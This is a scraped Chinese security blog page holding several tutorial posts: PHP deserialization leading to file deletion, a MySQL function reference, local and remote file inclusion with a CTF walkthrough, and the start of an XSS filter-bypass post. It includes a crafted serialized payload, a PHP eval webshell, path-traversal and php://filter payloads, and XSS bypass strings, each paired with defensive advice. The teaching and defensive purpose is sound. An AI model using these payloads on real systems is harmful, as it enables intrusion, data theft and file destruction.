<p>先创建logfile.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class LogFile    </span><br><span class="line">&#123;    </span><br><span class="line">    // log文件名</span><br><span class="line">    public $filename = &apos;error.log&apos;;</span><br><span class="line">    // 储存日志文件</span><br><span class="line">    public function LogData($text)    </span><br><span class="line">    &#123;    </span><br><span class="line">        echo &apos;Log some data: &apos; . $text . &apos;&lt;br /&gt;&apos;;    </span><br><span class="line">        file_put_contents($this-&gt;filename, $text, FILE_APPEND);    </span><br><span class="line">    &#125;</span><br><span class="line">    // 删除日志文件    </span><br><span class="line">    public function __destruct()    </span><br><span class="line">    &#123;    </span><br><span class="line">        echo &apos;__destruct deletes &quot;&apos; . $this-&gt;filename . &apos;&quot; file. &lt;br /&gt;&apos;;    </span><br><span class="line">        unlink(dirname(__FILE__) . &apos;/&apos; . $this-&gt;filename);    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>这是一个很简单的日志文件处理的类，其中有一处需要注意的地方就是在对象消亡的时候，有一个析构函数来显示一条删除的提示并删除这个日志文件。</p>
<p>下来我们看一个使用他的例子,创建一个日志文件1.log，再创建一个log.php写入如下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;logfile.php&apos;;    </span><br><span class="line">$obj = new LogFile();    </span><br><span class="line">$obj-&gt;filename = &apos;1.log&apos;;    </span><br><span class="line">$obj-&gt;LogData(&apos;Test&apos;);</span><br><span class="line">//一些操作</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>这个例子里，我们创建了一个新的LogFile对象，filename是1.log，然后在一些我们进行的操作之后，对象要消亡时1.log就会被删除。这是一个正常的使用方式。</p>
<p>然后如果服务器其他位置的一个脚本unserialize.php可以进行反序列化，而且参数可控，比如下面代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;logfile.php&apos;;    </span><br><span class="line">class User    </span><br><span class="line">&#123;    </span><br><span class="line">    // 类数据</span><br><span class="line">    public $age = 0;    </span><br><span class="line">    public $name = &apos;&apos;;</span><br><span class="line">    public function PrintData()    </span><br><span class="line">    &#123;    </span><br><span class="line">        echo &apos;User &apos; . $this-&gt;name . &apos; is &apos; . $this-&gt;age . &apos; years old. &lt;br /&gt;&apos;;    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line">$usr = unserialize($_GET[&apos;usr_serialized&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>然后我们就可以在这里利用反序列化来对服务器上文件进行删除操作。</p>
<p>假如我们网站主页index.php是这样的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;exist&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>然后我们正常访问是：</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/unserialize/unserialize03.png" alt=""></p>
<p>然后我们在刚才可以调用unserialize函数的页面，url后面构造如下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/serialize/unserialize.php?usr_serialized=O:7:&quot;LogFile&quot;:1:&#123;s:8:&quot;filename&quot;;s:9:&quot;index.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/unserialize/unserialize04.png" alt=""></p>
<p>就会发现，主页被删除：</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/unserialize/unserialize05.png" alt=""></p>
<h2 id="0x04-应对"><a href="#0x04-应对" class="headerlink" title="0x04 应对"></a>0x04 应对</h2><ul>
<li>严格控制unserialize函数的参数，对unserialize后的变量内容进行检查，过滤</li>
</ul>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/28/mysql数据库内置函数总结/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/04/28/mysql数据库内置函数总结/" itemprop="url">
                  mysql数据库内置函数总结
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-28T22:30:35+08:00">
                2018-04-28
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/笔记/" itemprop="url" rel="index">
                    <span itemprop="name">笔记</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/04/28/mysql数据库内置函数总结/" class="leancloud_visitors" data-flag-title="mysql数据库内置函数总结">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>熟练的掌握mysql语法和函数是开发人员和安全工作中必备的技能，所以决定将mysql的内置函数全部整理一遍，用作笔记。</p>
<h2 id="0x01-数学函数"><a href="#0x01-数学函数" class="headerlink" title="0x01 数学函数"></a>0x01 数学函数</h2><ul>
<li>greatest()——返回一组数中的最大值</li>
<li>least()——返回一组数中的最小值</li>
<li>floor()——返回一个数的向下取整</li>
<li>ceiling()——返回一个数的向上取整</li>
<li>round()——返回一个数四舍五入后的整数值</li>
<li>truncate()——把一个数字截取为指定小数位数的数字</li>
<li>abs()——返回一个数的绝对值</li>
<li>sign()——返回一个数的符号，正数返回1，负数返回-1，零返回0</li>
<li>sqrt()——返回一个数的平方根</li>
<li>pow()——以一个数作为另一个数的指数，并返回结果</li>
<li>sin()——返回一个角度(弧度)的正弦</li>
<li>cos()——返回一个角度(弧度)的余弦</li>
<li>tan()——返回一个角度(弧度)的正切</li>
<li>asin()——返回一个角度(弧度)的反正弦</li>
<li>acon()——返回一个角度(弧度)的反余弦</li>
<li>atan()——返回一个角度(弧度)的反正切</li>
<li>bin()——返回一个数的二进制，作为字符串</li>
<li>otc()——返回一个数的八进制，作为字符串</li>
<li>hex()——返回一个数的十六进制，作为字符串</li>
</ul>
<h2 id="0x02-聚合函数"><a href="#0x02-聚合函数" class="headerlink" title="0x02 聚合函数"></a>0x02 聚合函数</h2><ul>
<li>count()——求组中项数，返回int型整数</li>
<li>max()——求最大值</li>
<li>min()——求最小值</li>
<li>sum()——返回表达式所有值的和</li>
<li>avg()——求组中值的平均值</li>
<li>std()——返回给定表达式中所有值的标准差</li>
<li>variance()——返回给定表达式中所有值</li>
<li>group_concat()——返回由属于一组的列值连接组合而成的结果</li>
<li>bit_and()——逻辑与</li>
<li>bit_or()——逻辑或</li>
<li>bit_xor()——逻辑异或</li>
</ul>
<h2 id="0x03-字符串函数"><a href="#0x03-字符串函数" class="headerlink" title="0x03 字符串函数"></a>0x03 字符串函数</h2><ul>
<li>ascii(char)——返回表达式最左端字符的ascii码值</li>
<li>char(x1,x2,x3)——将括号中的多个数字转换成字符，结果组合成一个字符串</li>
<li>left(str,x)——返回从字符串左边开始指定的x个字符</li>
<li>right(str,x)——返回从字符串右边开始指定的x个字符</li>
<li>trim(str)——删除字符串首部和尾部所有空格</li>
<li>ltrim(str)——删除字符串首部所有空格</li>
<li>rtrim(str)——删除字符串尾部所有空格</li>
<li>rpad(str,n,pad)——用字符串pad对str的右边进行填补直到字符串str中字符大于等于n个，然后返回前n个字符</li>
<li>lpad(str,n,pad)——用字符串pad对str的左边进行填补直到字符串str中字符大于等于n个，然后返回前n个字符</li>
<li>replace(str1,str2,str3)——用字符串str3替换str1中出现的所有str2</li>
<li>concat(str1,str2…strn)——连接字符串</li>
<li>substring(expr,start,length)——返回expr中从start开始，长度为length的子串</li>
<li>strcmp(str1,str2)——比较两个字符串，相等返回0，str1大返回1，str2大返回-1</li>
</ul>
<h2 id="0x04-日期和时间函数"><a href="#0x04-日期和时间函数" class="headerlink" title="0x04 日期和时间函数"></a>0x04 日期和时间函数</h2><ul>
<li>now()——获取当前的日期和时间</li>
<li>curtime()——获取当前的时间</li>
<li>curdate()——获取当前的日期</li>
<li>year()——分析一个日期值返回其中年的部分</li>
<li>motnth()——以数值类型返回月的部分</li>
<li>monthname()——以字符串的类型返回月的部分</li>
<li>dayofyear()——返回这一天在这一年中的序数</li>
<li>dayofmonth()——返回这一天在这一月中的序数</li>
<li>dayofweek()——返回这一天在这一周中的序数</li>
<li>hour()——返回时间值的小时部分</li>
<li>minute()——返回时间值的分钟部分</li>
<li>second()——返回时间值的秒部分</li>
<li>data_add()——对日期进行增加操作</li>
<li>data_sub()——对日期进行减少操作</li>
</ul>
<h2 id="0x05-加密函数"><a href="#0x05-加密函数" class="headerlink" title="0x05 加密函数"></a>0x05 加密函数</h2><ul>
<li>aes_encrypt(str,key)和aes_decrypt(str,key)——对str用密钥key进行aes加密，解密</li>
<li>encode()和decode()——对一个字符串进行加密，解密</li>
<li>encrypt(str,key)——使用unix crypt()系统加密字符串（在windows上不可用）</li>
<li>password(str)——返回str加密后的字符串</li>
</ul>
<h2 id="0x06-控制流函数"><a href="#0x06-控制流函数" class="headerlink" title="0x06 控制流函数"></a>0x06 控制流函数</h2><ul>
<li>ifnull(expr1,expr2)——判断参数expr1是否为null，为null时返回expr2，否则返回expr1</li>
<li>nullif(expr1,expr2)——判断两个参数是否相等，如相等，返回null，如不相等，返回第一个参数</li>
<li>if(expr1,expr2,expr3)——如果expr1表达式为真，则返回expr2，否则返回expr3</li>
</ul>
<h2 id="0x07-格式化函数"><a href="#0x07-格式化函数" class="headerlink" title="0x07 格式化函数"></a>0x07 格式化函数</h2><ul>
<li>format()——把数值格式化为以逗号为间隔的数字序列</li>
<li>data_format()——把数值格式化成日期格式</li>
<li>time_format()——把数值格式化为时间格式</li>
</ul>
<h2 id="0x08-类型转换函数"><a href="#0x08-类型转换函数" class="headerlink" title="0x08 类型转换函数"></a>0x08 类型转换函数</h2><ul>
<li>cast(expr,AS type)——将一个值转换为指定的数据类型</li>
</ul>
<h2 id="0x09-系统信息函数"><a href="#0x09-系统信息函数" class="headerlink" title="0x09 系统信息函数"></a>0x09 系统信息函数</h2><ul>
<li>database()——返回当前数据库名</li>
<li>benchmark(n,expr)——将表达式expr重复运行n次</li>
<li>charset()——返回字符串的字符集</li>
<li>connection_id()——返回当前客户的连接id</li>
<li>found_rows()——将最后一次select查询的行数返回</li>
<li>user()——返回当前登陆的用户名</li>
<li>version()——返回当前mysql服务器版本</li>
</ul>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/26/文件包含漏洞/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/04/26/文件包含漏洞/" itemprop="url">
                  文件包含漏洞
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-26T20:33:04+08:00">
                2018-04-26
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
                    <span itemprop="name">渗透测试</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/04/26/文件包含漏洞/" class="leancloud_visitors" data-flag-title="文件包含漏洞">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-文件包含漏洞"><a href="#0x00-文件包含漏洞" class="headerlink" title="0x00 文件包含漏洞"></a>0x00 文件包含漏洞</h2><p>PHP文件包含漏洞，就是在通过函数包含文件时，由于没有对包含的文件名进行有效的过滤处理，被攻击者利用从而导致了包含了Web根目录以外的文件进来，就会导致文件信息的泄露甚至注入了恶意代码。</p>
<h2 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h2><p>文件包含漏洞主要是程序员把一些公用的代码写在一个单独的文件中，然后使用其他文件进行包含调用，如果需要包含的文件使用硬编码，一般是不会出现安全问题，但是有时可能不确定需要包含哪些具体文件，所以就会采用变量的形式来传递需要包含的文件，但是在使用包含文件的过程中，未对包含的变量进行检查及过滤，导致外部提交的恶意数据作为变量进入到了文件包含的过程中，从而导致提交的恶意数据被执行。  </p>
<p>文件包含通常分为本地文件包含(Local File Inclusion)和远程文件包含(Remote File Inclusion)。allow_url_fopen和 allow_url_include为0n的情况认为是远程文件包含漏洞，allow_url_fopen为off和 allow_url_include为0n为本地文件包含漏洞。</p>
<h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>首先我们在wamp环境创建如下文件：</p>
<p>index.php:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if($_GET[p])&#123;</span><br><span class="line">	include $_GET[p];</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">	include &quot;home.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>home.php:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;home&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>123.txt:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;123&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>然后访问index.php，出现home。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include01.png" alt=""></p>
<p>访问index.php?p=123.txt,出现123，则环境搭建完成。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include02.png" alt=""></p>
<h2 id="0x03-本地文件包含"><a href="#0x03-本地文件包含" class="headerlink" title="0x03 本地文件包含"></a>0x03 本地文件包含</h2><p>我们先尝试本地文件包含漏洞，即获取的文件在搭载漏洞网站的服务器上，我们可以先尝试在桌面创建一个test.txt，写入如下内容。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;test&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>然后通过file协议访问index.php?p=file:///C:/Users/Leticia/Desktop/test.txt，发现显示test，说明可以apache服务器的权限很高，可以访问其他盘符位置，这样就可以遍历整个机器读取其中的敏感信息。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include03.png" alt=""></p>
<p>如果将test.txt中的内容换成一句话木马：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval ($_POST[&apos;leticia&apos;])</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>然后重新访问index.php?p=file:///C:/Users/Leticia/Desktop/test.txt，用菜刀连接一句话木马，发现可以获取整个计算机的读写权限。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include04.png" alt=""></p>
<h2 id="0x04-远程文件包含"><a href="#0x04-远程文件包含" class="headerlink" title="0x04 远程文件包含"></a>0x04 远程文件包含</h2><p>我们再尝试远程文件包含，上面已经说过，要使allow_url_fopen和 allow_url_include为0n，所以远程文件包含非常少见，我们为了测试漏洞，就先打开wamp安装路径下的php.ini文件，将这两条改为ON。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include05.png" alt=""></p>
<p>然后我们在虚拟机上新建一个文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;ok&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>在虚拟机打开一个http server，然后访问index.php?p=<a href="http://192.168.31.203:8000/2.txt" target="_blank" rel="noopener">http://192.168.31.203:8000/2.txt</a></p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include06.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include07.png" alt=""></p>
<p>如果把2.txt文件改成一句话木马，即可用菜刀连接。</p>
<h2 id="0x05-利用方法"><a href="#0x05-利用方法" class="headerlink" title="0x05 利用方法"></a>0x05 利用方法</h2><p>文件包含漏洞有很多利用方式：</p>
<h4 id="1、读取敏感文件"><a href="#1、读取敏感文件" class="headerlink" title="1、读取敏感文件"></a>1、读取敏感文件</h4><p>如../../../../../etc/passwd来读取敏感文件。</p>
<h4 id="2、包含shell"><a href="#2、包含shell" class="headerlink" title="2、包含shell"></a>2、包含shell</h4><p>如有其他漏洞将shell写入目标服务器中，或者可以远程包含自己服务器的shell，就可以通过包含shell文件来通过目标服务器apache来执行shell，用来提权之类的操作。</p>
<h4 id="3、配合文件上传漏洞"><a href="#3、配合文件上传漏洞" class="headerlink" title="3、配合文件上传漏洞"></a>3、配合文件上传漏洞</h4><p>如果上传的木马文件所在的路径不可以通过外网访问，但是可以通过文件包含漏洞读取，那么就可以构造参数将该文件运行，就可以得到webshell。</p>
<h4 id="4、使用PHP封装协议读取文件和写入PHP文件"><a href="#4、使用PHP封装协议读取文件和写入PHP文件" class="headerlink" title="4、使用PHP封装协议读取文件和写入PHP文件"></a>4、使用PHP封装协议读取文件和写入PHP文件</h4><p>读取文件，可以通过输入page参数值如下：php://filter/read=convert.base64-encode/resource=../../../../../var/www/html/upload/xxx.txt来读取并执行。</p>
<p>写入文件，可以通过传入page=php://input，然后post提交我们要输入的内容。</p>
<h2 id="0x06-一个ctf例子"><a href="#0x06-一个ctf例子" class="headerlink" title="0x06 一个ctf例子"></a>0x06 一个ctf例子</h2><p>我们可以用一个ctf的例子来看看实际中怎么利用。</p>
<p>是iscc的一道web题</p>
<p>目标网址是一张图片 <a href="http://118.190.152.202:8006/" target="_blank" rel="noopener">http://118.190.152.202:8006/</a></p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include08.png" alt=""></p>
<p>源码中只有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;show.php?img=1.jpg&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<p>然后我们点开 <a href="http://118.190.152.202:8006/show.php?img=1.jpg" target="_blank" rel="noopener">http://118.190.152.202:8006/show.php?img=1.jpg</a></p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include09.png" alt=""></p>
<p>看到这个img参数，很容易想到文件包含漏洞</p>
<p>然后访问 <a href="http://118.190.152.202:8006/show.php?img=file:///show.php" target="_blank" rel="noopener">http://118.190.152.202:8006/show.php?img=file:///show.php</a> 尝试访问本页面源码<br>发现file not find</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include10.png" alt=""></p>
<p>但是我们知道php://filter可以指定两个resource，这个时候构造<br><a href="http://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=1.jpg/resource=show.php" target="_blank" rel="noopener">http://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=1.jpg/resource=show.php</a></p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include11.png" alt=""></p>
<p>然后查看源代码就可以看本页面代码了，接下来根据源码读取flag.php，查看源码，就完成了 <a href="http://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=1.jpg/resource=../flag.php" target="_blank" rel="noopener">http://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=1.jpg/resource=../flag.php</a></p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include12.png" alt=""></p>
<h2 id="0x07-应对"><a href="#0x07-应对" class="headerlink" title="0x07 应对"></a>0x07 应对</h2><ul>
<li><p>1.判断包含中的参数是否外部可控。</p>
</li>
<li><p>2.限制被包含的文件只能在某一个文件夹内，特别是一定要禁止目录跳转字符，如：“../”。</p>
</li>
<li><p>3.验证被包含的文件是否在白名单中。</p>
</li>
<li><p>4.尽量不要使用变量，如要使用包含，直接规定好包含的文件名，如：“include(“head.php”)”。</p>
</li>
<li><p>5.可以通过调用str_replace()函数实现相关敏感字符的过滤，一定程度上防御了远程文件包含。</p>
</li>
<li><p>6.如非必要，不要打开远程文件包含。 </p>
</li>
</ul>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/24/XSS绕过和利用方式总结/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/04/24/XSS绕过和利用方式总结/" itemprop="url">
                  XSS绕过和利用方式总结
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-24T22:02:17+08:00">
                2018-04-24
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
                    <span itemprop="name">渗透测试</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/04/24/XSS绕过和利用方式总结/" class="leancloud_visitors" data-flag-title="XSS绕过和利用方式总结">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-XSS"><a href="#0x00-XSS" class="headerlink" title="0x00 XSS"></a>0x00 XSS</h2><p>XSS，跨站脚本攻击(Cross Site Scripting)，恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。比如获取用户Cookie，会话劫持，钓鱼欺骗等多种攻击。</p>
<h2 id="0x01-绕过"><a href="#0x01-绕过" class="headerlink" title="0x01 绕过"></a>0x01 绕过</h2><p>实际的情况中，很多网站会对&lt;&gt;，script等关键词进行限制，也有的不允许在input中运行js脚本，这个时候，就需要去考虑怎么绕过。</p>
<ul>
<li>1 大小写混用</li>
</ul>
<p>首先是最简单的大小写混用，对一些仅仅匹配过滤的系统进行绕过，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ScRipt&gt;AleRt(&apos;xss&apos;)&lt;/ScRipt&gt;</span><br></pre></td></tr></table></figure></p>
<ul>
<li>2 利用HTML标签属性值执行</li>
</ul>
<p>在某些系统中，用户不能自己构造html标签，这个时候可以使用html标签属性值调用js，比如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;table background=&quot;jacascript:alert(/xss/)&quot;&gt;&lt;/table&gt;</span><br><span class="line">&lt;img src=&quot;javascript:alert(&apos;xss&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<ul>
<li>3 回车空格等</li>
</ul>
<p>在有些系统中，xss Filter仅仅将敏感字符列入黑名单，可以通过空格，tab，回车来绕过限制，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javas cript:alert(&apos;xss&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<p>或者换行输入用分号分隔：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javas</span><br><span class="line">cript:</span><br><span class="line">alert(&apos;xss&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<ul>
